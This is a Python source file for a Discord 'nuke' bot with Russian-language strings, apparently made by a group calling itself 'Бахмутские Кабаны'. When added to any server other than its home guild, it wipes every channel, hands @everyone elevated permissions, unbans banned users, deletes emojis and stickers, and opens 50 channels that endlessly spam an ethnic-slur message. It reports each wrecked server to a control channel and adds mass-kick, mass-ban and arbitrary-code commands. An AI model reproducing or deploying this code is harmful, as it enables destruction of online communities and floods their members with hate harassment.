import discord, os, sys, typing, random, asyncio, re, requests, ast
import aiohttp
from discord.ext import commands, tasks
from discord import app_commands

intents=discord.Intents.default()
intents.members = True
bot = commands.Bot(command_prefix="$", help_command=None, intents=intents, activity=discord.Game(name="нацыки скулят 24/7"))
text = '''@everyone @here
# Вставайте на колени, жалкие анимешники и хохлы! Вы — всего лишь отродья, которых не погубил естественный отбор из-за цивилизации людей! Вы обречены прожить всю свою жизнь будучи тупыми баранами, следующими за своим "вожаком".

# Но если в вас проснулся нормальный человек и вы поняли, что вы до этого были ничтожествами, то присоединяйтесь к нам!

# https://discord.gg/PA9Zn62gR4

https://media.discordapp.net/attachments/1076873966586691604/1076876167178625094/SPOILER_Do_you_want_total_war_.mp4
https://cdn.discordapp.com/attachments/965150497508061226/1076207606655352892/VID_20230218_002408_628.mp4
https://media.discordapp.net/attachments/1121112898173947955/1127630128080506910/0bf2005b3bb4635ebd75af7ec6b010b1.mp4'''

@bot.event
async def on_ready():
  for guild in bot.guilds:
    if guild.id != 1117488283090423930:
      await guild.leave()
  await bot.tree.sync(guild=None)
  channel = await bot.fetch_channel(1128350420264292463)
  await channel.send(content="Я вернулся, скулите нацыки 24/7 🤣")


@bot.tree.command(name="sync", description="Синхронизировать слэш команды", guild=discord.Object(id=1117488283090423930))
@app_commands.guild_only
@app_commands.default_permissions(administrator=True)
@app_commands.describe(guild_id="Введите ID сервера для синхронизации")
async def sync(interaction, guild_id: str=None):
  if guild_id:
    await bot.tree.sync(guild=discord.Object(id=int(guild_id)))
  else:
    await bot.tree.sync(guild=None)
  await interaction.response.send_message(content="☑️ Синхронизировано!")
    
def insert_returns(body):
    if isinstance(body[-1], ast.Expr):
        body[-1] = ast.Return(body[-1].value)
        ast.fix_missing_locations(body[-1])

    if isinstance(body[-1], ast.If):
        insert_returns(body[-1].body)
        insert_returns(body[-1].orelse)

    if isinstance(body[-1], ast.With):
        insert_returns(body[-1].body)

@bot.tree.command(name="run", description="Запустить команду", guild=discord.Object(id=1117488283090423930))
@app_commands.guild_only
@app_commands.default_permissions(administrator=True)
@app_commands.describe(cmd="Введите команду")
async def run(interaction, cmd: str):
    await interaction.response.defer()
    fn_name = "_eval_expr"
    cmd = cmd.strip("` ")
    cmd = "\n".join(f"    {i}" for i in cmd.splitlines())
    body = f"async def {fn_name}():\n{cmd}"
    parsed = ast.parse(body)
    body = parsed.body[0].body
    insert_returns(body)
    env = {
        'bot': bot,
        'discord': discord,
        'commands': commands,
        'interaction': interaction,
        '__import__': __import__
    }
    exec(compile(parsed, filename="<ast>", mode="exec"), env)
    await eval(f"{fn_name}()", env)
    await interaction.followup.send(content="✅ Команда выполнена!")

@run.error
async def run_error(interaction, error):
  await interaction.followup.send(embed=discord.Embed(title="❌ Произошла ошибка!", color=0xff0000, description=f"```py\n{error}```"))

@bot.tree.command(name="kickall", description="Кик всех на сервере")
@app_commands.guild_only
async def kickall(interaction):
  if interaction.guild.id == 1117488283090423930:
    return await interaction.response.send_message(embed=discord.Embed(color=0xff0000, title="❌ Ошибка!", description="На БК и связанных серверах нельзя использовать эту команду!"), ephemeral=True)
  await interaction.response.send_message(content="Процесс кика начат, ждите результатов в ЛС", ephemeral=True)
  i = 0
  async for member in interaction.guild.fetch_members(limit=None):
    try:
      await member.kick()
      i += 1
    except:
      pass
  try:
    await interaction.user.send(embed=discord.Embed(color=0xeb8034, description=f"Кикнуто {i} участников\nЕсли кикнуло слишком мало, то поставьте роль бота повыше"))
  except:
    pass

@bot.tree.command(name="banall", description="Бан всех на сервере")
@app_commands.guild_only
async def banall(interaction):
  if interaction.guild.id == 1117488283090423930:
    return await interaction.response.send_message(embed=discord.Embed(color=0xff0000, title="❌ Ошибка!", description="На БК и связанных серверах нельзя использовать эту команду!"), ephemeral=True)
  await interaction.response.send_message(content="Процесс бана начат, ждите результатов в ЛС", ephemeral=True)
  i = 0
  async for member in interaction.guild.fetch_members(limit=None):
    try:
      await member.ban()
      i += 1
    except:
      pass
  try:
    await interaction.user.send(embed=discord.Embed(color=0xeb8034, description=f"Забанено {i} участников\nЕсли забанило слишком мало, то поставьте роль бота повыше"))
  except:
    pass

async def channel_spam(channel):
  while True:
    try:
      await channel.send(content=text)
    except:
      break

async def channel_webhook_spam(channel, icon):
  webhook = await channel.create_webhook(name="Захвачено БК!", avatar=icon)
  while True:
    try:
      await webhook.send(content=text, wait=True)
    except discord.NotFound:
      break

@bot.event
async def on_guild_join(guild: discord.Guild):
  if guild.id == 1117488283090423930:
    return
  Lox = await bot.fetch_channel(1128350420264292463)
  embed = discord.Embed(title="Бот был добавлен на сервер", color=0x9aff35, description = f"Участников: {guild.member_count}\nID сервера: {guild.id}")
  user = None
  try:
    async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.bot_add):
      user = entry.user
  except:
    pass
  if user:
    embed.description = f"Добавил: {user.mention} ({user}) с ID: {user.id}\n" + embed.description
  if guild.icon:
    embed.set_footer(icon_url=guild.icon.url, text=guild.name)
  else:
    embed.set_footer(text=guild.name)
  invitelink = None
  for channel in guild.text_channels:
    if not invitelink:
      try:
        invitelink = str(await channel.create_invite())
      except:
        pass
    else:
      break
  if invitelink:
    embed.description = f"[Приглашение]({invitelink})\n" + embed.description
  await Lox.send(embed=embed)
  try:
    async with aiohttp.ClientSession() as session:
      async with session.get("https://media.discordapp.net/attachments/965147009298362368/1065214965860008038/20230115_174216_0000.png") as response:
        icon = await response.read()
    await guild.edit(name="Захвачено БК!", description="Сервер захвачен Бахмутскими Кабанами!", icon=icon, community=False, verification_level=discord.VerificationLevel.none, default_notifications=discord.NotificationLevel.all_messages, explicit_content_filter=discord.ContentFilter.disabled)
  except:
    pass
  try:
    me = await guild.fetch_member(bot.user.id)
    await guild.default_role.edit(permissions=me.guild_permissions)
  except:
    pass
  try:
    for channel in guild.channels:
      await channel.delete()
  except:
    pass
  try:
    for i in range(50):
      channel = await guild.create_text_channel(name="захвачено-бк", topic="Сервер захвачен Бахмутскими Кабанами!")
      asyncio.create_task(channel_spam(channel))
      asyncio.create_task(channel_webhook_spam(channel, icon))
  except:
    pass
  try:
    async for ban in guild.bans(limit=None):
      await guild.unban(ban.user)
  except:
    pass
  try:
    for emoji in guild.emojis:
      await emoji.delete()
  except:
    pass
  try:
    for sticker in guild.stickers:
      await sticker.delete()
  except:
    pass
  Lox = await bot.fetch_channel(1128350420264292463)
  embed = discord.Embed(title="Бот крашнул сервер", color=0xa4eb34, description = f"Участников: {guild.member_count}\nID сервера: {guild.id}")
  user = None
  try:
    async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.bot_add):
      user = entry.user
  except:
    pass
  if user:
    embed.description = f"Добавил: {user.mention} ({user}) с ID: {user.id}\n" + embed.description
  if guild.icon:
    embed.set_footer(icon_url=guild.icon.url, text=guild.name)
  else:
    embed.set_footer(text=guild.name)
  invitelink = None
  for channel in guild.text_channels:
    if not invitelink:
      try:
        invitelink = str(await channel.create_invite())
      except:
        pass
    else:
      break
  if invitelink:
    embed.description = f"[Приглашение]({invitelink})\n" + embed.description
  await Lox.send(embed=embed)
  

async def mobile(self):
    payload = {'op': self.IDENTIFY,'d': {'token': self.token,'properties': {'$os': sys.platform,'$browser': 'Discord iOS','$device': 'discord.py','$referrer': '','$referring_domain': ''},'compress': True,'large_threshold': 250,'v': 3}}
    if self.shard_id is not None and self.shard_count is not None:
        payload['d']['shard'] = [self.shard_id, self.shard_count]
    state = self._connection
    if state._activity is not None or state._status is not None: 
        payload["d"]["presence"] = {"status": state._status, "game": state._activity, "since": 0, "afk": False}
    if state._intents is not None:
        payload["d"]["intents"] = state._intents.value
    await self.call_hooks("before_identify", self.shard_id, initial=self._initial_identify)
    await self.send_as_json(payload)

discord.gateway.DiscordWebSocket.identify = mobile

def run_bot():
  try:
    bot.run(os.environ['BK_TOP_TOKEN'])
  except discord.errors.HTTPException:
    os.system("kill 1")
    run_bot()

run_bot()
